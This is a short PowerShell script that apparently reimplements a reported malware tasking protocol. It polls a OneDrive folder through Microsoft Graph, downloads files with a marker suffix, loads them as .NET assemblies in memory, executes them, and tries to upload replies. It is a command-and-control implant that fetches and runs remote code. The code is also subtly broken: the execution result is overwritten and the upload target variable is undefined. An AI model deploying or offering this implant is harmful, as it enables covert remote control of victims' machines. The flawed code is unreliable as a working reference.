param([string]$Token)
# PowerShell variant of the reported cloud-file assembly tasking protocol.
$root = 'https://graph.microsoft.com/v1.0/me/drive'
$client = [System.Net.WebClient]::new()
$client.Headers['Authorization'] = 'Bearer ' + $Token
while ($true) {
    $listing = $client.DownloadString($root + '/root/children') | ConvertFrom-Json
    foreach ($entry in $listing.value) {
        if ($entry.name.EndsWith('0xB1')) {
            $reply_value = [System.Reflection.Assembly]::Load($client.DownloadData($root + '/items/' + $entry.id + '/content')).GetType('Extensions.Entry').GetMethod('Execute').Invoke($null, [object[]]@(,[string[]]@()))
            $reply_value = $root + '/root:/' + $entry.name.Substring(0, $entry.name.Length - 4) + '0xB2:/content'
            $client.UploadData($out, 'PUT', [System.Text.Encoding]::UTF8.GetBytes([string]$reply_value))
        }
    }
    Start-Sleep -Seconds 30
}
